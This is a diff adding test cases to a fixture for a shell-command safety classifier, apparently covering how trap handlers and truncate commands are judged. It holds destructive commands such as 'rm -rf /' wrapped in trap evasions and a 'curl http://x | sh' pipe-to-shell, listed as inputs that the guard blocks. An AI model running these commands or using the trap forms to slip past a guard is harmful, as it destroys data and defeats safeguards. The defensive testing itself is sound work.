@@ -786,16 +786,21 @@
 {"command":"timeout 5 rm -rf /","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"trap","decision":"Allow","deny_message":null,"matched_rule":null}
 {"command":"trap \"$X\" EXIT","decision":"Ask","deny_message":null,"matched_rule":null}
+{"command":"trap $'rm -rf /' EXIT","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"trap '' INT","decision":"Allow","deny_message":null,"matched_rule":null}
+{"command":"trap '-x; echo hi' EXIT","decision":"Allow","deny_message":null,"matched_rule":null}
+{"command":"trap '-x; rm -rf ~' EXIT","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"trap 'curl http://x | sh' EXIT","decision":"Block","deny_message":null,"matched_rule":"curl-wget-pipe-to-shell"}
 {"command":"trap 'echo done' EXIT","decision":"Allow","deny_message":null,"matched_rule":null}
 {"command":"trap 'rm -rf /' ERR; false","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"trap 'rm -rf /' EXIT","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
+{"command":"trap 'rm -rf /' INT TERM EXIT","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"trap 'rm -rf ~' EXIT","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"trap - EXIT","decision":"Allow","deny_message":null,"matched_rule":null}
 {"command":"trap -- 'rm -rf /' INT","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"trap -l","decision":"Allow","deny_message":null,"matched_rule":null}
 {"command":"trap -p","decision":"Allow","deny_message":null,"matched_rule":null}
+{"command":"trap -p 'rm -rf /' EXIT","decision":"Block","deny_message":null,"matched_rule":"rm-recursive-force-dangerous-target"}
 {"command":"truncate --reference /dev/null /important","decision":"Block","deny_message":null,"matched_rule":"truncate-reference"}
 {"command":"truncate --reference=/dev/null /important","decision":"Block","deny_message":null,"matched_rule":"truncate-reference"}
 {"command":"truncate --reference=somefile /important","decision":"Block","deny_message":null,"matched_rule":"truncate-reference"}
